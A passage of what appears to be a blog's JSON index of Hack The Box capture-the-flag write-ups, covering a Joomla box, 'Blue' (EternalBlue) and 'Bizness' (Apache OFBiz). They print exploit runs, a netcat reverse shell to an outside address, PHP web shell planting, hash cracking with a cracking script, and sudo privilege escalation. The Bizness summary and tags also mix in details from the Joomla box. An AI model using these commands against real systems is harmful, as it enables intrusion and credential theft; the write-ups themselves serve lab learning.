-Pn -p- 10.10.11.242Service versionsnmap -Pn -sV -p80,22 10.10.11.242Output22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.980/tcp open  http    nginx 1.18.0 (Ubuntu)2. EnumerationPort 22nc -nv 10.10.11.242 22The banner matches the service versionPORT 80Checking the web application.Main tools: Wappalyzer  Nginx 1.18.0With netcat, it also returned the page code even without adding the domain.nc -nv 10.10.11.242 80GET / HTTP/1.0Performing fuzzing of directories and filesgobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirb/big.txt  -t 50Searching for subdomains.gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txtAfter finding http://dev.devvortex.htb/, I added it to my /etc/hosts file to view what was available through the browser.Fuzzing directories on the subdomainferoxbuster -u http://dev.devvortex.htb/I found the admin pagehttp://dev.devvortex.htb/administrator/I tried logging in with default credentials, but it didn’t work.Checking the robots.txt file3. ExploitationRunning Joomscan to find the version.joomscan -u http://dev.devvortex/  Version: 4.2.6Searching for vulnerabilities related to the version.GitHub - Acceis/exploit-CVE-2023-23752: Joomla! &lt; 4.2.8 - Unauthenticated information disclosureReading the Wxploit requirements, it was necessary to install three Ruby gems (libraries) in a Ruby environment.Utilization of the exploit:git clone https://github.com/Acceis/exploit-CVE-2023-23752.gitcd exploit-CVE-2023-23752gem install httpx docopt paintExploitruby exploit.rb [http://dev.devvortex.htb](http://dev.devvortex.htb/)User: lewisPass: P4ntherg0t1n5r3c0n##Usuario do BancoLogin successfulIn the templates, I will send a reverse shell.I chose the file: error_ful.phpThe shell I sent was from Pentest Monkey with my information of socketFiquei escutando na porta 1234rlwrap -cAr nc -vnlp 1234Location of the file: templates/cassiopeia/error_full.phpInitial AccessHowever, the user did not have any permissionsI improved the shell with Python:python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Since the user had database access, let’s access the database.mysql -ulewis -pP4ntherg0t1n5r3c0n##show databases;use joomlashow tables;SELECT * FROM sd4fg_users;The hash of the user with permissions was captured.$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12Cracknano hashjohn --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt                    User: logon        Pass: tequieromucho            SSH access:sh -oHostKeyAlgorithms=+ssh-dss logan@10.10.11.242The -oHostKeyAlgorithms=+ssh-dss parameter you added to the SSH command specifies the use of the DSA (ssh-dss) host key algorithm. This parameter might be necessary when you encounter connection issues due to differences in the SSH client and server versions or specific cryptographic configurations.4. Post-ExploitationPrivilege EscalationSudo Misconfigurationsudo -lI couldn’t find it on GTFOBins, so I searched on Googlehttps://github.com/diego-tella/CVE-2023-1326-PoCI pressed options 1 and 2, then hit enter to call the bash with !/bin/bash"
  },
  
  {
    "title": "Blue",
    "url": "/posts/Hack-The-Box-Blue/",
    "categories": "CTF, Hack The Box",
    "tags": "EASY, Windows, SMB, MS17-010, EternalBlue",
    "date": "2024-07-05 00:00:00 -0300",
    





    
    "snippet": "The exploration of  box “Blue” involved several critical steps. It started with scanning for open ports using the nmap tool, identifying key services like FTP and SMB. Although FTP access was refus...",
    "content": "The exploration of  box “Blue” involved several critical steps. It started with scanning for open ports using the nmap tool, identifying key services like FTP and SMB. Although FTP access was refused, the SMB service was found vulnerable to the MS17-010 exploit, commonly known as EternalBlue. Exploitation was carried out using Metasploit, specifically the exploit/windows/smb/ms17_010_eternalblue module. After setting the necessary parameters, a successful shell was obtained with privileged access, leading to root access. This process included network vulnerability exploitation and privilege escalation, culminating in full system control.Overviewgraph TD    A[Inteligence Gathering]    A --&gt; B[Port Scan &gt; Ports 21,445]    B --&gt; C[Enumeration: SMB Service &gt; MS17-010]    C --&gt; D[Exploitation &gt; EternalBlue &gt; Root Access] 1. Intelligence GatheringPort Scannmap --top-ports=10 -Pn -T4 10.10.10.40Service versions2. EnumerationPort 21connection refusedPort 445Script for the vulnerability (nmap)nmap -p 139,443,445 10.10.10.40 --script smb-vuln-ms17-010Search for an exploit for vulnerability CVE-2017-01433. ExploitationOpen the Metasploit framework and search for ms17-010Use the exploit exploit/windows/smb/ms17_010_eternalblueSet the information for the exploit.I already have the shell with privileged accessRoot Access"
  },
  
  {
    "title": "Bizness",
    "url": "/posts/Hack-The-Box-Bizness/",
    "categories": "CTF, Hack The Box",
    "tags": "EASY, Linux, Joomla, Local File Include, CVE-2023-23752, apport-cli 2.26.0, CVE-2023-1326",
    "date": "2024-07-05 00:00:00 -0300",
    





    
    "snippet": "The exploration of the target machine began with a port scan using nmap, identifying active services and versions. Enumeration revealed a Joomla installation vulnerable to CVE-2023-23752, which all...",
    "content": "The exploration of the target machine began with a port scan using nmap, identifying active services and versions. Enumeration revealed a Joomla installation vulnerable to CVE-2023-23752, which allowed unauthorized access. Further investigation of port 80 led to discovering an authentication bypass vulnerability in Apache OFBiz, which was exploited to gain initial access through a reverse shell. During post-exploitation, a .dat file contained a hashed password, which was cracked using a custom script, ultimately providing root access.Overviewgraph TD    A[Inteligence Gathering]    A --&gt; B[Port Scan &gt; Ports 22, 80]    B --&gt; C[Enumeration: HTTP &gt; Joomla]    C --&gt; D[Exploitation &gt; CVE-2023-23752, LFI]    D --&gt; E[Post-Exploitation: Privilege Escalation &gt; Apport-Cli 2.26.0]    E --&gt; F[Root Shell Access]1. Intelligence GatheringPort Scannmap -sS -Pn --open -p- 10.10.11.252 -n -T4Active service versions2. EnumerationPort 80I performed directory fuzzing:dirb https://bizness.htb/ -w /usr/share/wordlists/dirb/big.txthttps://bizness.htb/catalog/ redirected to → https://bizness.htb/catalog/control/main.Searching about OFBizhttps://github.com/jakabakos/Apache-OFBiz-Authentication-BypassSonicWall threat research identified a critical authentication bypass vulnerability with a CVSS score of 9.8, presenting an alarming risk to system integrity.Let’s check first if it’s vulnerable.git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.gitpython3 exploit.py --url https://bizness.htb3. ExploitationcmdIt executes commands but doesn’t provide any output, so let’s try sending a shell with netcat.python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/sh 10.10.14.137 666'I received the shell.rlwrap -cAr nc -vnlp 666python3 -c 'import pty;pty.spawn(\"/bin/bash\")'Initial Access4. Post-ExploitationPrivilege EscalationI found the following “.dat” file.cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6650.datThere was a hash in the strings of the file.  $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNNChecking the type of hash:Hash Type Identifier - Identify unknown hashesI couldn’t crack it with John the Ripper or HashcatI used this script to crack the hashcracker.py#!/bin/python3#Author: PatxaSecimport hashlibimport base64import os, sysfrom tqdm import tqdmclass PasswordEncryptor:    def __init__(self, hash_type=\"SHA\", pbkdf2_iterations=10000):        self.hash_type = hash_type        self.pbkdf2_iterations = pbkdf2_iterations    def crypt_bytes(self, salt, value):        if not salt:          salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')        hash_obj = hashlib.new(self.hash_type)        hash_obj.update(salt.encode('utf-8'))        hash_obj.update(value)        hashed_bytes = hash_obj.digest()        result = f\"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}\"        return result    def get_crypted_bytes(self, salt, value):      try:        hash_obj = hashlib.new(self.hash_type)        hash_obj.update(salt.encode('utf-8'))        hash_obj.update(value)        hashed_bytes = hash_obj.digest()        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')      except hashlib.NoSuchAlgorithmException as e:          raise Exception(f\"Error while computing hash of type {self.hash_type}: {e}\")hash_type = \"SHA1\"salt = \"d\"search = \"$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=\"wordlist = '/usr/share/wordlists/rockyou.txt'encryptor = PasswordEncryptor(hash_type)total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))with open(wordlist, 'r', encoding='latin-1') as password_list:    for password in tqdm(password_list, total=total_lines, desc=\"Processing\"):        value = password.strip()        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))        if hashed_password == search:            breakprint(f'\\n [+] Pwnd !!! {hashed_password}::::{value}')  monkeybiznessChecking if it works for the superuserRoot Access"
  }
  
]

